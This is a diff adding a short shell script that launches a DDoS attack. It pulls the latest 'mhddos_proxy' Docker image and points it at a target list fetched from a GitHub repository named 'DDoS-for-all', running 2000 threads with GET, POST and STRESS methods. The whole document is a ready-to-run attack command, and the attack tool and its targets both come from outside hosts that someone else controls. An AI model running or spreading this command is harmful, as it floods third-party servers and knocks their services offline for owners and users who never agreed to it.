@@ -1,0 +1,3 @@
+#!/bin/sh
+
+docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest -c https://raw.githubusercontent.com/SlavaUkraineSince1991/DDoS-for-all/main/targets/targets.txt -t 2000 --table --http-methods GET POST STRESS
